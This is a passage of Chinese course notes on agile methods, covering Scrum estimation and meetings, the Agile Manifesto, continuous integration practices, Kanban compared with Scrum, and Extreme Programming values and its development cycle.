<h4 id="估算单位"><a href="#估算单位" class="headerlink" title="估算单位"></a>估算单位</h4><p><strong>Storypoint：故事点</strong>，选取可识别的最小用例为2个storypoint.其它估算都是相对值，在所有sprint中保持该相对值一致。我们在估算速度时，估计我们能在一个迭代周期内能够完成的storypoint。</p>
<p>**T恤尺码：**经常使用的序列是S、M、L。如果工作项比L大，他们会把它拆分成大小为S、M和L的更小条目。一个XL的条目会占用团队太多的产能，也不便于管理。必要时可以使用XS和XL。</p>
<h4 id="估算过程"><a href="#估算过程" class="headerlink" title="估算过程"></a>估算过程</h4><h5 id="计划扑克"><a href="#计划扑克" class="headerlink" title="计划扑克"></a>计划扑克</h5><p>&lt;imgsrc&#x3D;”<a href="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250107153758194.png%22alt=%22image-20250107153758194%22style=%22zoom:33%;%22/%3E">https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250107153758194.png&quot;alt=&quot;image-20250107153758194&quot;style=&quot;zoom:33%;&quot;/&gt;</a></p>
<p><strong>价值：</strong></p>
<ol>
<li>传统估算通常是一个人在思考，而使用纸牌估算是，鼓励跨职能团队的多个团队成员参与估算，团队成员可以从不同的视角来思考和分析问题，估算的过程中考虑的更加全面、估算也更加准确</li>
<li>在估算过程中，团队对估算的结果进行讨论和评判，在一个高度透明的环境下，估算的结果更加真实和客观。这样也避免了很多时候过于武断，或是拍脑袋做出的决定</li>
<li>估算的过程也是一个只是分享和学习的过程，对某一个条目不清楚的成员通过其他成员的阐述会增加对该条目涉及到的要点的认识</li>
</ol>
<h5 id="卡片队列估算法"><a href="#卡片队列估算法" class="headerlink" title="卡片队列估算法"></a>卡片队列估算法</h5><p>&lt;imgsrc&#x3D;”<a href="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250107153916328.png%22alt=%22image-20250107153916328%22style=%22zoom:33%;%22/%3E">https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250107153916328.png&quot;alt=&quot;image-20250107153916328&quot;style=&quot;zoom:33%;&quot;/&gt;</a></p>
<h5 id="”金发女孩“估算技术"><a href="#”金发女孩“估算技术" class="headerlink" title="”金发女孩“估算技术"></a>”金发女孩“估算技术</h5><p>作为对工作项大小估计的替代，你可以把工作项调整到合适的大小。</p>
<p>你不再是指定每个工作项的大小，而是去分割或组合工作项，让它们的规模大致相当，并便于后续操作。</p>
<h4 id="估算有差异的原因"><a href="#估算有差异的原因" class="headerlink" title="估算有差异的原因"></a>估算有差异的原因</h4><ol>
<li>需求理解不同</li>
<li>技术不熟悉</li>
</ol>
<h4 id="减小故事规模"><a href="#减小故事规模" class="headerlink" title="减小故事规模"></a>减小故事规模</h4><p>很多团队要求每个故事的大小在2-8个故事点，大于8要求拆分故事。</p>
<h3 id="计划会议"><a href="#计划会议" class="headerlink" title="计划会议"></a>计划会议</h3><p>定下每日例会的时间和地点：这必须是每一个成员都能接受的时间和地点。</p>
<p>确定技术故事：需要完成但是不属于可交付物的东西，如：</p>
<ul>
<li>安装持续构建服务器</li>
<li>编写系统设计概览</li>
</ul>
<h4 id="产物：Sprint信息页"><a href="#产物：Sprint信息页" class="headerlink" title="产物：Sprint信息页"></a><strong>产物：Sprint信息页</strong></h4><p>&lt;imgsrc&#x3D;”<a href="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250107154221583.png%22alt=%22image-20250107154221583%22style=%22zoom:33%;%22/%3E">https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250107154221583.png&quot;alt=&quot;image-20250107154221583&quot;style=&quot;zoom:33%;&quot;/&gt;</a></p>
<h4 id="管理：白板"><a href="#管理：白板" class="headerlink" title="管理：白板"></a><strong>管理：白板</strong></h4><p>&lt;imgsrc&#x3D;”<a href="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250107154701158.png%22alt=%22image-20250107154701158%22style=%22zoom:33%;%22/%3E">https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250107154701158.png&quot;alt=&quot;image-20250107154701158&quot;style=&quot;zoom:33%;&quot;/&gt;</a></p>
<h4 id="跟踪进度：燃尽图"><a href="#跟踪进度：燃尽图" class="headerlink" title="跟踪进度：燃尽图"></a><strong>跟踪进度：燃尽图</strong></h4><p>&lt;imgsrc&#x3D;”<a href="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250107154722996.png%22alt=%22image-20250107154722996%22style=%22zoom:33%;%22/%3E">https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250107154722996.png&quot;alt=&quot;image-20250107154722996&quot;style=&quot;zoom:33%;&quot;/&gt;</a></p>
<h4 id="布置房间"><a href="#布置房间" class="headerlink" title="布置房间"></a>布置房间</h4><p>让团队坐在一起，让ProductOwner无路可走，让经理和教练无路可走。</p>
<h4 id="静默时间"><a href="#静默时间" class="headerlink" title="静默时间"></a>静默时间</h4><p>“flow”心流时间，全神贯注在某件事情，以至于忘记了时间的流逝。</p>
<p>公司层面可以为程序员设计专门的静默时间。</p>
<h3 id="每日站会"><a href="#每日站会" class="headerlink" title="每日站会"></a>每日站会</h3><p>不超过15分钟。回答三个问题：</p>
<ul>
<li>“昨天我做了什么。”</li>
<li>“今天准备干什么。”</li>
<li>“你遇到了什么障碍，需要其他人如何帮你。”</li>
</ul>
<p>移动任务板上的即时贴到对应的地方。</p>
<p>每日例会一结束就要计算剩余工作故事点并更新燃尽图•团队每日报到、简短、及时开始与结束、聚焦重点、有规律性。</p>
<h3 id="Sprint演示会议"><a href="#Sprint演示会议" class="headerlink" title="Sprint演示会议"></a>Sprint演示会议</h3><h4 id="为什么定义Sprint结束于演示？"><a href="#为什么定义Sprint结束于演示？" class="headerlink" title="为什么定义Sprint结束于演示？"></a>为什么定义Sprint结束于演示？</h4><ul>
<li>其他人可以了解你的团队在做什么</li>
<li>团队得到认可，团队成员感觉很好</li>
<li>不同的团队得到交流，讨论各自工作</li>
<li>演示可以吸引相干人士的关注，并得到重要的反馈</li>
<li>演示会迫使团队真正完成一些工作而不是貌似完成，这样不会污染下一个Sprint</li>
</ul>
<h4 id="检查列表"><a href="#检查列表" class="headerlink" title="检查列表"></a>检查列表</h4><ul>
<li>确保明确阐述Sprint目标</li>
<li>集中精力演示可以实际工作的代码</li>
<li>演示保持快节奏</li>
<li>演示我们做了什么而不是我们怎么做的</li>
<li>不演示细碎bug的修复和微不足道的特性</li>
</ul>
<h3 id="Sprint回顾会议"><a href="#Sprint回顾会议" class="headerlink" title="Sprint回顾会议"></a>Sprint回顾会议</h3><p><strong>Sprint回顾是仅次于Sprint计划的第二重要的事件！</strong></p>
<p>这是做出改进的最佳时期。</p>
<p>**主题：**我们怎样才能在下个Sprint中做的更好，不是追究责任！</p>
<p>**活动列表：**根据要讨论的内容范围,设定时间为1至3个小时。</p>
<p><strong>使用白板</strong></p>
<h2 id="Scrum局限"><a href="#Scrum局限" class="headerlink" title="Scrum局限"></a>Scrum局限</h2><p>没有技术实践！</p>
<p>可以使用极限编程技术实践：测试驱动开发、简单设计、重构、持续集成等等。</p>
<h1 id="敏捷开发"><a href="#敏捷开发" class="headerlink" title="敏捷开发"></a>敏捷开发</h1><h2 id="敏捷宣言"><a href="#敏捷宣言" class="headerlink" title="敏捷宣言"></a>敏捷宣言</h2><p>我们一直在实践中探寻更好的软件开发方法，身体力行的同时也帮助他人。由此我们建立了如下价值观：</p>
<ol>
<li>个体和互动高于流程和工具</li>
<li>工作的软件高于详尽的文档</li>
<li>客户合作高于合同谈判</li>
<li>响应变化高于遵循计划</li>
</ol>
<p>也就是说，尽管右项有其价值，我们更重视左项的价值。</p>
<h3 id="个体和互动高于流程和工具"><a href="#个体和互动高于流程和工具" class="headerlink" title="个体和互动高于流程和工具"></a>个体和互动高于流程和工具</h3><p>敏捷力的基本宗旨之一就是，干活的人最清楚该如何完成工作。</p>
<p>可以建议他们用，让他们尝试，但不要规定！</p>
<p>流程和工具必须是为人服务的，而不是反过来。</p>
<h3 id="工作的软件高于详尽的文档"><a href="#工作的软件高于详尽的文档" class="headerlink" title="工作的软件高于详尽的文档"></a>工作的软件高于详尽的文档</h3><p>如果文档着眼于创造价值和以有利方式推动项目进展，那就没问题。例如，对大多数产品来说，用户文档都是很有价值的组成部分。</p>
<p>但如果关注焦点不再是产品本身，而变成了流程文档，例如“你的测试规程说明报告，记得要用新封皮!”，那就有问题了。</p>
<p>人们普遍误以为敏捷团队是不写文档不做计划的，但实际上，敏捷团队是做计划的，因为计划需要不断地进行细化和更新。敏捷软件项目中的计划以各种形式出现在我们身边，例如用户故事、列表(backlog)、验收测试、和大型可视图表，它们组成了富沟通环境。</p>
<p>如果不是文档，敏捷团队该到哪里去找答案呢?你可以求助于可工作软件，它包含了最近构建、测试和集成的一切。</p>
<h3 id="客户合作高于合同谈判"><a href="#客户合作高于合同谈判" class="headerlink" title="客户合作高于合同谈判"></a>客户合作高于合同谈判</h3><p>敏捷价值观着重强调，开发团队和客户之间要保持尽可能公开和顺畅的对话。</p>
<p>基于合同的项目侧重方向不对。相关各方就像是一群合伙人，齐心协力在规定时间和预算范围内努力构建最有价值的系统。</p>
<h3 id="响应变化高于遵循计划"><a href="#响应变化高于遵循计划" class="headerlink" title="响应变化高于遵循计划"></a>响应变化高于遵循计划</h3><p>计划驱动型组织通常都有“变化控制”流程。</p>
<p>只有在变更可控的情况下，变化控制才会有效果。</p>
<p>创造价值才是衡量软件开发成功的标准！</p>
<h1 id="持续集成"><a href="#持续集成" class="headerlink" title="持续集成"></a>持续集成</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>持续集成(ContinuousIntegration,CI)是一种软件开发实践，在实践中项目成员频繁地进行集成，通常每个成员每天都会做集成工作，如此，每天整个项目将会有多次集成。</p>
<p>许多团队都发现这种方法大大地减少了集成问题，并且能够快速地开发出高内聚性的软件。</p>
<p>“持续集成”源自于极限编程（XP），并且是XP最初的12种实践之一。</p>
<h2 id="关键实践"><a href="#关键实践" class="headerlink" title="关键实践"></a>关键实践</h2><h3 id="维护一个单一的代码库"><a href="#维护一个单一的代码库" class="headerlink" title="维护一个单一的代码库"></a>维护一个单一的代码库</h3><p>做为最基本的持续集成实践，请保证你使用一款代码管理系统。</p>
<p>当你有了代码管理系统之后，确保每个开发者都能方便的获得到源代码。所有东西都必须在代码库里。</p>
<p>原则是：在一台新机器上checkout代码后构建也能构建成功。新机器上的东西应该尽量的少，通常包括很大的，难于安装的，并且稳定的软件，比如操作系统，Java开发环境或者数据库管理系统等。</p>
<h3 id="使构建自动化"><a href="#使构建自动化" class="headerlink" title="使构建自动化"></a>使构建自动化</h3><p>将源代码变成一个能运行的软件系统通常是一个复杂的过程，包括编译，文件搬移，加载数据库模式等等。但其中大多数任务都是可以自动化的，并且也应该被自动化。</p>
<p>构建所需的自动化环境对于软件系统来说是一个通用功能。当你用这些工具构建和启动系统时，请确保只使用一个命令完成任务。</p>
<p>一个常见的错误是在自动化构建里并没有完全包括构建所需的东西，比如构建过程中应该从代码库里取得数据库模式文件并自动执行之。</p>
<p>任何人都应该能够在一台新机器上拉下代码库中的代码，并只用一个命令将系统运行起来。</p>
<p>优秀的构建工具能够分析出哪些地方需要做相应的修改，并将这个分析过程本身做为整个构建过程的一部分。</p>
<p>根据自己的需要（考虑到集成代价），你可以选择不同的东西进行构建。构建中既可以包括测试，也可以不包括，甚至可以包括不同的测试板块。有些组件可以进行单独构建。构建脚本应该能够允许你针对不同的情形进行不同的构建目标。</p>
<h3 id="使构建自测试"><a href="#使构建自测试" class="headerlink" title="使构建自测试"></a>使构建自测试</h3><p>一种快速并高效发现bug的方法是将自动化测试包含到构建过程中。当然，测试也不见得完美，但的确能发现很多bug——足够多了。随着极限编程（XP）的流行，测试驱动开发（TDD）也使自测试代码流行起来，越来越多的人开始注意到这种技术的价值所在。</p>
<p>对于自测试代码而言，你需要一组自动化测试来检测大部分代码库中的bug。测试能通过一个简单得命令来运行并且具备自检功能。测试的结果应该能指出哪些测试是失败的。对于自测试的构建来说，测试失败应导致构建失败。</p>
<h3 id="每人每天都向代码库提交代码"><a href="#每人每天都向代码库提交代码" class="headerlink" title="每人每天都向代码库提交代码"></a>每人每天都向代码库提交代码</h3><p>集成首先在于交流，它使其他成员能够看到你所做的修改。在这种频繁的交流下，大家都能很快地知道开发过程中所做的修改。</p>
<p>在向主线提交代码之前，开发人员必须保证本地构建成功。这当然也包括使测试全部通过。另外，在提交之前需要更新本地代码以匹配主线代码，然后在本地解决主线代码与本地代码之间的冲突，再在本地进行构建。如果构建成功，便可以向主线提交代码了。</p>
<p>在这种频繁提交下，开发者可以快速地发现自己代码与他人代码之间的冲突。快速解决问题的关键在于快速地发现问题。几个小时的提交间隔使得代码冲突也可以在几个小时内发现，此时大家的修改都不多，冲突也不大，因此解决冲突也很简单。对于好几周都发现不了的冲突，通常是很难解决的。</p>
<h3 id="每次提交都应在集成服务器上进行构建"><a href="#每次提交都应在集成服务器上进行构建" class="headerlink" title="每次提交都应在集成服务器上进行构建"></a>每次提交都应在集成服务器上进行构建</h3><p>应该保证在集成服务器上进行构建，只有当集服务器机上构建成功后，才表明你的任务完成了。由于提交者需要对自己的提交负责，他就得盯着主线上的构建，如果失败，马上修改。</p>
<p>主线构建：一是手动构建，二是使用持续集成服务器(Jenkins)。</p>
<h3 id="快速构建"><a href="#快速构建" class="headerlink" title="快速构建"></a>快速构建</h3><p>持续集成的关键在于快速反馈，需要长时间构建的CI是极其糟糕的。</p>
<p>对于多数项目来说，将构建时间维持在10分钟之内是合理的，这也是XP的方针之一。</p>
<p>引入阶段性构建——对于企业级应用来说，我们发现构建时间的瓶颈通常发生在测试上，特别是那些需要于外部交互的测试——比如数据库。</p>
<h3 id="在与生产环境相同的环境中运行测试"><a href="#在与生产环境相同的环境中运行测试" class="headerlink" title="在与生产环境相同的环境中运行测试"></a>在与生产环境相同的环境中运行测试</h3><p>测试旨在发现可能在生产环境中出现的问题，因此如果你的测试环境与生产环境不同，那么测试很有可能发现不了生产环境中的bug。</p>
<p>虚拟化技术：虚拟机、Docker</p>
<h3 id="使任何人都能轻易获得可执行文件"><a href="#使任何人都能轻易获得可执行文件" class="headerlink" title="使任何人都能轻易获得可执行文件"></a>使任何人都能轻易获得可执行文件</h3><p>项目中的所有成员都应能够获得最新的可执行文件并能成功的运行，目的可以包括做演示，浏览测试或者仅仅看看项目本周有何修改。</p>
<p>确保一个通用的地方来存放最新可执行文件。</p>
<h3 id="人人都能看到正在发生什么"><a href="#人人都能看到正在发生什么" class="headerlink" title="人人都能看到正在发生什么"></a>人人都能看到正在发生什么</h3><p>持续集成主要在于交流，因此应当保证每人都能轻易看到当前系统的状态和已做的修改。</p>
<p>CI服务器：Jenkins</p>
<h3 id="自动化部署"><a href="#自动化部署" class="headerlink" title="自动化部署"></a>自动化部署</h3><p>自动化部署脚本，不仅包括测试环境的脚本，也包括针对生产环境的部署脚本。虽然我们不是每天都向生产环境部署，但自动化部署不仅可以加速部署过程，并且能够减少部署错误。</p>
<p>如果你已经有了生产环境的自动化部署，那么也应该考虑一下相应的自动化回滚。由于失败是时而会发生的事情，在这种情况下，我们希望能快速回滚到失败之前的状态。</p>
<p>在集群环境中，有每次只向一个节点部署的情况，由此在几个小时之内逐渐完成所有节点的部署。</p>
<p>对于一些面向公众的Web应用，我所了解的另外一种很有趣的部署方式是，先试验性针对一部分用户进行部署，再通过这些用户的试用情况来决定是否向所有用户部署。（灰度发布、A&#x2F;B测试）</p>
<h2 id="持续集成的好处"><a href="#持续集成的好处" class="headerlink" title="持续集成的好处"></a>持续集成的好处</h2><ul>
<li><p>降低风险！</p>
<ul>
<li>已经处于项目的末期，但是仍然不知到何时才能结束。</li>
<li>延期集成的缺点在于，很难预测集成到底要花多少时间，更糟的是，你很难了解集成的进展情况。</li>
<li>持续集成正好解决了这些问题。每次集成的时间都不长，任何时候你都知道自己所处的情况，软件的哪些地方在工作，哪些没有。</li>
</ul>
</li>
<li><p>Bug</p>
<ul>
<li>持续集成并不能消除bug，却能帮你快速的发现bug并予以清除。Bug也存在积累性，bug越多，越难清除。部分原因在于bug之间存在牵连。另外也存在心理因素，bug一多，人便没那么多精力去修了——这就是所谓的“BrokenWindows综合征”。</li>
</ul>
</li>
<li><p>持续部署</p>
<ul>
<li>有了持续集成，频繁部署也不是什么难事了。频繁部署的价值在于，你的客户可以快速的享用软件的新功能，并能快速的提出反馈。这将有利于清除客户和开发之间的障碍——我认为这是软件开发最大的障碍。</li>
</ul>
</li>
</ul>
<h2 id="引入持续集成"><a href="#引入持续集成" class="headerlink" title="引入持续集成"></a>引入持续集成</h2><ol>
<li>第一步需要将构建自动化，并将你所需的所有东西都放在代码管理系统中，可以通过一个命令来构建整个系统。</li>
<li>在构建中引入一些自动化测试，试着确定出现问题的主要范围，并用自动化测试去发现这些问题。</li>
<li>使提交构建快速完成。</li>
<li>对于新项目，从项目开始就采用持续集成。</li>
<li>寻找帮助，找有经验的人帮助你。</li>
</ol>
<h1 id="看板方法Kanban"><a href="#看板方法Kanban" class="headerlink" title="看板方法Kanban"></a>看板方法Kanban</h1><p>**看板方法（KanbanMethod）**是一种敏捷管理方法，用于帮助团队管理工作流程并逐步改进生产效率。它起源于丰田汽车的精益生产体系，后来被引入软件工程领域，广泛应用于项目管理和产品开发中。</p>
<h2 id="核心概念"><a href="#核心概念" class="headerlink" title="核心概念"></a>核心概念</h2><h3 id="白板：可视化工作"><a href="#白板：可视化工作" class="headerlink" title="白板：可视化工作"></a>白板：可视化工作</h3><p>通过使用看板（Kanbanboard）将工作流程和任务状态以直观的方式展示出来。看板通常分为几列，每列表示工作流程的不同阶段，例如：待处理（ToDo）、进行中（InProgress）、已完成（Done）。</p>
<h3 id="WIP（WorkinProgress）"><a href="#WIP（WorkinProgress）" class="headerlink" title="WIP（WorkinProgress）"></a>WIP（WorkinProgress）</h3><p>**限制在制品(WIP)**是限制同时进行中的工作数量，减少在制品使其快速流过整个工作流，即前置时间缩短。</p>
<ul>
<li>致力于减少同时处理的工作项</li>
<li>批量规模越小，前置时间越短</li>
<li>流动效率提升的同时资源效率会有所降低</li>
<li>立即实施:停止立项并开始完成</li>
<li>限制在制品将使改进机会浮出水面，着手改进后会获得更快的流动</li>
<li>不要企图找到一个唯一正确的数字作为团队的在制品限制规模</li>
<li>在制品限制不是仅为了设立规则，而是为了触发讨论</li>
</ul>
<h3 id="紧急工作"><a href="#紧急工作" class="headerlink" title="紧急工作"></a>紧急工作</h3><p>&lt;imgsrc&#x3D;”<a href="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250107162741465.png%22alt=%22image-20250107162741465%22style=%22zoom:33%;%22/%3E">https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250107162741465.png&quot;alt=&quot;image-20250107162741465&quot;style=&quot;zoom:33%;&quot;/&gt;</a></p>
<h3 id="度量"><a href="#度量" class="headerlink" title="度量"></a>度量</h3><ul>
<li>有利于团队改进</li>
<li>团队自己选择度量指标，但不要将度量指标用于绩效考核</li>
<li>两个常用的度量指标为:<ul>
<li>前置时间是整个工作流的时间</li>
<li>吞吐量是一定时间段内完成的工作项数量</li>
</ul>
</li>
</ul>
<h2 id="看板不是？"><a href="#看板不是？" class="headerlink" title="看板不是？"></a>看板不是？</h2><p>看板并不是一种软件开发生命周期的方法学，也不是一种项目管理的方法。</p>
<p>实施看板时，需要当前已经有一些在运行的过程，这样便可应用看板来逐步改变当前运行的过程。</p>
<h2 id="Kanban与Scrum"><a href="#Kanban与Scrum" class="headerlink" title="Kanban与Scrum"></a>Kanban与Scrum</h2><table>
<thead>
<tr>
<th>scrum</th>
<th>kanban</th>
</tr>
</thead>
<tbody><tr>
<td>规定了固定时长的迭代。</td>
<td>固定时长的迭代是可选的。计划、发布、过程改进等活动可以各有各的节奏。它可以由事件驱动，不用非要固定时长。</td>
</tr>
<tr>
<td>用生产率作为计划和过程改进的默认度量手段。</td>
<td>用生产周期作为计划和过程改进的默认度量手段。</td>
</tr>
<tr>
<td>规定了跨功能团队</td>
<td>跨功能团队是可选的。可以有专职团队</td>
</tr>
<tr>
<td>任务必须分解以便在1个Sprint里面能做完</td>
<td>没规定任务规模。</td>
</tr>
<tr>
<td>间接限制(每个Sprint的)WIP.</td>
<td>直接限制(每个工作流状态的)WIP.</td>
</tr>
<tr>
<td>不能往进行中的Sprint里面加任务。</td>
<td>只要有人手富余就可以加任务</td>
</tr>
<tr>
<td>一个sprintBacklog归一个团队所有。</td>
<td>一张看板图可以由多个团队或多人共用</td>
</tr>
<tr>
<td>规定了三种角色(PO、SM、Team)</td>
<td>没有规定任何角色</td>
</tr>
</tbody></table>
<h1 id="XP极限编程"><a href="#XP极限编程" class="headerlink" title="XP极限编程"></a>XP极限编程</h1><h2 id="开发周期"><a href="#开发周期" class="headerlink" title="开发周期"></a>开发周期</h2><h3 id="XP的心跳——开发周期"><a href="#XP的心跳——开发周期" class="headerlink" title="XP的心跳——开发周期"></a>XP的心跳——开发周期</h3><p>这是程序员实现一个工程任务（最小的调度单位）并与系统其余部分集成的地方。</p>
<h3 id="开发周"><a href="#开发周" class="headerlink" title="开发周"></a>开发周</h3><ol>
<li>1张顶层任务卡：“用户管理：登录、登出、组。”</li>
<li>获取结对编程伙伴</li>
<li>讨论任务</li>
<li>测试用例是什么？如果对任何事情不确定，向他人寻求帮助。</li>
<li>编写测试用例</li>
<li>测试失败</li>
<li>编写代码</li>
<li>运行所有测试用例</li>
<li>迭代测试用例和代码</li>
<li>如有需要，重构</li>
<li>集成，包括测试</li>
</ol>
<h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><ul>
<li>程序员成对编程。</li>
<li>开发由测试驱动。</li>
<li>成对不仅仅是使测试用例运行。成对为系统的分析、设计、实现和测试增加了价值。</li>
<li>集成紧随开发之后，包括集成测试。</li>
</ul>
<h2 id="变更成本"><a href="#变更成本" class="headerlink" title="变更成本"></a>变更成本</h2><h3 id="变更成本-1"><a href="#变更成本-1" class="headerlink" title="变更成本"></a>变更成本</h3><p>在某些情况下，软件变更成本随时间指数上升的趋势可以被平缓化。如果我们能够平缓这个曲线，关于软件开发最佳方式的传统假设就不再成立。</p>
<h3 id="变更成本的假设"><a href="#变更成本的假设" class="headerlink" title="变更成本的假设"></a>变更成本的假设</h3><p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250106103837884.png" alt="img"></p>
<p>软件工程的一个普遍假设是，随着时间的推移，修改程序的成本会指数上升。</p>
<p>“软件中修复一个问题的成本随时间指数上升。如果在需求分析阶段发现问题，修复成本可能只需要一美元，但一旦软件投入生产，修复成本可能高达数千美元。”</p>
<h3 id="降低变更成本的技术"><a href="#降低变更成本的技术" class="headerlink" title="降低变更成本的技术"></a>降低变更成本的技术</h3><p>软件开发界在最近几十年投入了大量资源试图降低变更成本——更好的语言、更好的数据库技术、更好的编程实践、更好的环境和工具、新的符号。</p>
<h3 id="变更成本可能不会随时间急剧上升"><a href="#变更成本可能不会随时间急剧上升" class="headerlink" title="变更成本可能不会随时间急剧上升"></a>变更成本可能不会随时间急剧上升</h3><p><img data-src="https://jinqiqing-bucket.oss-cn-nanjing.aliyuncs.com/img/image-20250106173918549.png" alt="img"></p>
<h3 id="XP的技术前提"><a href="#XP的技术前提" class="headerlink" title="XP的技术前提"></a>XP的技术前提</h3><p>如果变更成本随时间缓慢上升，你的行动方式将与在成本指数上升的假设下完全不同。</p>
<h3 id="如果变更成本很小，你会怎么做"><a href="#如果变更成本很小，你会怎么做" class="headerlink" title="如果变更成本很小，你会怎么做"></a>如果变更成本很小，你会怎么做</h3><ol>
<li>你会尽可能晚地做出重大决策，以推迟决策成本，并尽可能确保决策正确。</li>
<li>你只会实现你必须实现的部分，希望你预见到的明天的需求不会实现。</li>
<li>你只会在设计中引入简化现有代码或使编写下一段代码更简单的元素。</li>
</ol>
<h3 id="保持变更成本低"><a href="#保持变更成本低" class="headerlink" title="保持变更成本低"></a>保持变更成本低</h3><ul>
<li>在技术方面，对象是一个关键技术。</li>
<li>简单的设计，没有额外的设计元素——没有尚未使用但预计将来会使用的想法。</li>
<li>自动化测试，以便我们有信心知道我们是否意外改变了系统的现有行为。</li>
<li>大量修改设计的实践，以便在需要更改系统时，我们不会害怕尝试。</li>
</ul>
<h2 id="学习驾驶"><a href="#学习驾驶" class="headerlink" title="学习驾驶"></a>学习驾驶</h2><h3 id="问题与解决方案资源"><a href="#问题与解决方案资源" class="headerlink" title="问题与解决方案资源"></a>问题与解决方案资源</h3><ul>
<li>问题——风险的巨大成本，以及通过选择来管理该风险的机会</li>
<li>塑造解决方案所需的资源：在周期后期进行更改而不显著增加成本的自由。</li>
</ul>
<h3 id="小幅度调整与关注"><a href="#小幅度调整与关注" class="headerlink" title="小幅度调整与关注"></a>小幅度调整与关注</h3><ul>
<li>我们需要通过进行许多小幅度调整来控制软件的开发，而不是通过进行几次大幅度调整，有点像驾驶汽车。</li>
<li>始终保持关注。</li>
</ul>
<h2 id="四个价值观"><a href="#四个价值观" class="headerlink" title="四个价值观"></a>四个价值观</h2><p><strong>沟通、简单、反馈、勇气。</strong></p>
<h3 id="沟通"><a href="#沟通" class="headerlink" title="沟通"></a>沟通</h3><ul>
<li>开发者与开发者之间</li>
<li>开发者与客户之间</li>
<li>开发者与管理层之间</li>
<li>XP强制开发者进行沟通：<ul>
<li>单元测试</li>
<li>结对编程</li>
<li>任务估算</li>
</ul>
</li>
</ul>
<h3 id="简单"><a href="#简单" class="headerlink" title="简单"></a>简单</h3><ul>
<li>“能够起作用的最简单的事情是什么？”</li>
<li>XP认为，今天做一件简单的事情，明天如果需要再花一点代价去改变它，比今天做一件可能永远都不会用到的更复杂的事情要好。</li>
</ul>
<h4 id="沟通与简单的关系"><a href="#沟通与简单的关系" class="headerlink" title="沟通与简单的关系"></a>沟通与简单的关系</h4><ul>
<li>你沟通得越多，就越能清楚地看到究竟需要做什么，对那些真正不需要做的事情就越有信心。</li>
<li>你的系统越简单，需要沟通的内容就越少，这会导致更完整的沟通，特别是如果你能简化系统到只需要更少的程序员时。</li>
</ul>
<h3 id="反馈"><a href="#反馈" class="headerlink" title="反馈"></a>反馈</h3><ul>
<li>关于系统当前状态的具体反馈是绝对无价的。</li>
<li>首先，反馈在分钟和天的尺度上起作用。<ul>
<li>开发者的单元测试</li>
<li>开发者对客户的即时估算</li>
<li>进度跟踪人员向整个团队提供反馈</li>
</ul>
</li>
<li>反馈也在周和月的尺度上起作用。<ul>
<li>客户的功能测试</li>
<li>运行软件</li>
</ul>
</li>
</ul>
<h4 id="反馈、沟通与简单的关系"><a href="#反馈、沟通与简单的关系" class="headerlink" title="反馈、沟通与简单的关系"></a>反馈、沟通与简单的关系</h4><ul>
<li>你拥有的反馈越多，沟通就越容易。</li>
<li>简单的系统更容易测试（反馈）。</li>
<li>编写测试为你提供了系统可以有多简单的焦点。</li>
</ul>
<h3 id="勇气"><a href="#勇气" class="headerlink" title="勇气"></a>勇气</h3><ul>
<li><strong>丢弃代码</strong>：完全重来。</li>
<li>**爬山算法：**XP的设计策略类似于爬山算法。你先得到一个简单的设计，然后使其稍微复杂一些，再稍微简单一些，然后再稍微复杂一些。爬山算法的问题在于达到局部最优解，此时没有小的改变可以改善情况，但大的改变可以。</li>
</ul>
<h4 id="勇气与其他价值观"><a href="#勇气与其他价值观" class="headerlink" title="勇气与其他价值观"></a>勇气与其他价值观</h4><ul>
<li>如果没有前三个价值观，勇气本身只是单纯的黑客行为。</li>
<li>沟通支持勇气，因为它打开了进行更多高风险、高回报实验的可能性。</li>
<li>简单支持勇气，因为你可以负担得起在一个简单的系统中更加勇敢。</li>
<li>具体反馈支持勇气，因为如果你可以按下一个按钮并在最后看到测试变为绿色，你会感到更安全地对代码进行激进的手术。</li>
</ul>
<h3 id="价值观的实践——尊重"><a href="#价值观的实践——尊重" class="headerlink" title="价值观的实践——尊重"></a>价值观的实践——尊重</h3><ul>
<li>一个隐藏在其他四个价值观之下的——尊重。</li>
<li>如果团队成员彼此不在乎以及他们正在做的事情，XP就注定失败。</li>
<li>如果团队成员不在乎项目，没有什么可以拯救它。</li>
</ul>
<h2 id="回归基础"><a href="#回归基础" class="headerlink" title="回归基础"></a>回归基础</h2><h3 id="必须做的事情"><a href="#必须做的事情" class="headerlink" title="必须做的事情"></a>必须做的事情</h3><ul>
<li>我们希望做我们必须做的一切，以实现稳定、可预测的软件开发。</li>
<li>开发的四个基本活动是<strong>编码、测试、倾听和设计</strong>。</li>
</ul>
<h3 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h3><ul>
<li>它是你的工作成果。</li>
<li>其他方面：<ul>
<li>学习</li>
<li>沟通：精确</li>
</ul>
</li>
</ul>
<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><ul>
<li>“无法测量的东西就不存在”——科学哲学（对编程也成立）</li>
<li>测试让我有机会在实现方式之外思考我想要的东西。然后测试告诉我我是否实现了我认为自己实现的东西。</li>
</ul>
<h4 id="测试感染"><a href="#测试感染" class="headerlink" title="测试感染"></a>测试感染</h4><ul>
<li>测试告诉你何时完成——当测试运行时，你暂时完成了编码。</li>
<li>当你想不到任何可能失败的测试来编写时，你就完全完成了。</li>
</ul>
<h4 id="为什么测试？"><a href="#为什么测试？" class="headerlink" title="为什么测试？"></a>为什么测试？</h4><ul>
<li>长期答案是测试可以让程序更长久地运行（如果测试被运行和维护）。你可以更长时间地修改程序。</li>
<li>短期原因：信心</li>
<li>编程和测试结合在一起也比单纯编程更快。<ul>
